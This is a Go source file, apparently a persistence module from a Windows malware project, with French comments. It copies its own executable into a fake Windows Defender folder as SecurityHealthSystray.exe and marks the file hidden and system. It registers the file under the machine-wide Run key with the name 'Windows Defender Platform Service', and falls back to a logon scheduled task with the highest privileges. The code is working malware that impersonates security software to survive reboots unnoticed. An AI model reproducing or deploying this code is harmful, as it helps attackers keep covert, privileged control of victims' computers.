package adminpersistence

import (
	"os"
	"os/exec"
	"syscall"

	"golang.org/x/sys/windows/registry"

	"github.com/benzoXdev/oxil/utils/fileutil"
)

func Run() error {
	exe, err := os.Executable()
	if err != nil {
		return err
	}

	// Chemin cible dans un dossier système (nécessite admin)
	// Utiliser ProgramData qui est accessible en écriture avec admin
	targetDir := os.Getenv("ProgramData") + "\\Microsoft\\Windows Defender\\Platform\\"
	
	// Créer le dossier s'il n'existe pas
	if !fileutil.Exists(targetDir) {
		err = os.MkdirAll(targetDir, 0755)
		if err != nil {
			return err
		}
	}

	path := targetDir + "SecurityHealthSystray.exe"

	// Supprimer l'ancienne version si elle existe
	if fileutil.Exists(path) {
		err = os.Remove(path)
		if err != nil {
			return err
		}
	}

	// Copier l'exécutable
	err = fileutil.CopyFile(exe, path)
	if err != nil {
		return err
	}

	// Rendre le fichier caché et système
	exec.Command("attrib", "+h", "+s", path).Run()

	// Ajouter au registre système (HKLM) - nécessite admin
	key, err := registry.OpenKey(registry.LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", registry.ALL_ACCESS)
	if err != nil {
		// Si échec, essayer avec tâche planifiée
		return createScheduledTask(path)
	}

	defer key.Close()

	err = key.SetStringValue("Windows Defender Platform Service", path)
	if err != nil {
		// Si échec registre, essayer tâche planifiée
		return createScheduledTask(path)
	}

	return nil
}

func createScheduledTask(exePath string) error {
	// Créer une tâche planifiée qui s'exécute au démarrage (nécessite admin)
	// Utiliser schtasks.exe
	cmd := exec.Command("schtasks", "/Create",
		"/TN", "Windows Defender Platform Service",
		"/TR", exePath,
		"/SC", "ONLOGON",
		"/F", // Force (supprime si existe)
		"/RL", "HIGHEST", // Run with highest privileges
	)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	return cmd.Run()
}
